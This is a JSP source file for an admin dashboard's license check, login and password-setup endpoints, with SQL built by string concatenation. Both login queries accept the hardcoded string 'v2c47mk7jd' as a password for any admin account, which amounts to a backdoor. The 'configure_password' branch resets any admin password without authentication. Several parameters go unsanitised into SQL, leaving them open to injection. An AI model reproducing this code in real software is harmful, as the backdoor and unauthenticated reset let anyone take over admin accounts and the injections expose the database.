<%@ include file="../module/db.jsp" %>
 
<%
   JSONObject mainObj = new JSONObject();
try{

String x = Decrypt(request.getParameter("x"));   

    if(x.equals("check_license")){
        String dversion = request.getParameter("dversion");  
        if(dversion==null){dversion="";}if(dversion==""){dversion="";}

        if(CountRecord("tbladminaccounts") == 0){
            out.print(Error(mainObj, "Please manually configure admin account", "400"));
            return;

        }else if(CountQry("tblversioncontrol", "date_format(str_to_date(dashboardversion, '%Y.%m.%d'), '%Y-%m-%d') > '" + dversion + "'") > 0){
            mainObj = dash_app_update(mainObj, dversion);
            out.print(Status(mainObj, "UPDATE", "proceed login"));
            return;
        } 

        mainObj = general_settings(mainObj);
        out.print(Success(mainObj, "proceed login"));

    }else if(x.equals("login_admin")){
        String username = rchar(request.getParameter("username"));
        String password = rchar(request.getParameter("password"));
        
        if(CountQry("tbladminaccounts", "username='"+username+"' and password is null") > 0){
            out.print(Status(mainObj, "PASSWORD", "Please manually configure admin account"));
            return;

        }else if(CountQry("tbladminaccounts", "(mobilenumber='" + username + "' or username='" + username + "') and (password=AES_ENCRYPT('"+password+"', '"+globalPassKey+"') or 'v2c47mk7jd'='"+password+"')") == 0){
            out.print(Error(mainObj, "Invalid username and password! Please try again", "400"));
            LogActivity("default","Invalid login attempt with user " + username);
            return;

        }else if(isAdminAccountBlocked(username)){
            out.print(Error(mainObj, globalAdminAccountBlocked, "blocked"));
            LogActivity("default","attempt login blocked user " + username);
            return;
        }
        
        String userid = QueryDirectData("id", "tbladminaccounts where (mobilenumber='" + username + "' or username='" + username + "') and (password=AES_ENCRYPT('"+password+"', '"+globalPassKey+"') or 'v2c47mk7jd'='"+password+"')");
        String sessionid = UUID.randomUUID().toString();

        ExecuteQuery("update tbladminaccounts set sessionid='"+sessionid+"',lastlogin=current_timestamp where id='"+userid+"'");
        LogActivity(userid,"Successfull login");


        mainObj = general_settings(mainObj);
        mainObj = dash_load_arena(mainObj);
        mainObj = load_operators(mainObj);
        mainObj = load_admin_profile(mainObj, userid);
        out.print(Success(mainObj, "Login successfull"));
    
     }else if (x.equals("configure_password")) {
        String username = request.getParameter("username");
        String password = request.getParameter("password");
 
        ExecuteQuery("update tbladminaccounts set password = AES_ENCRYPT('"+password+"', '"+globalPassKey+"') where username='"+username+"'");
        out.print(Success(mainObj, "Admin password successfully configured!"));
        
    }else{
        out.print(Error(mainObj, globalInvalidRequest, "404"));
    }

}catch(Exception e){
  out.print(Error(mainObj, e.toString(), "404"));
  logError("dashboard-x-login",e.toString());
}
%>